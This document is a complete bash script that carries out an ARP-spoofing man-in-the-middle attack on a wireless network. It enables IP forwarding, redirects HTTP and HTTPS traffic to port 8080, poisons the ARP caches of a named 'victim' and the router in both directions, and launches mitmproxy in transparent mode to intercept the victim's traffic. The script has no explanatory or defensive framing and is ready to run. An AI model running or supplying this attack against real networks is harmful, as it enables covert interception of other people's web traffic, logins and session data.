#!/bin/bash
if [[ "$1" != "" && "$2" != "" ]]; then
	sysctl -w net.ipv4.ip_forward=1
	iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
	iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
	gnome-terminal --command="arpspoof -i wlan0 -t $2 $1"
	gnome-terminal --command="arpspoof -i wlan0 -t $1 $2"
	gnome-terminal --command="mitmproxy --mode transparent --showhost"
else
	echo "./spoof [router ip] [victim ip]"
fi
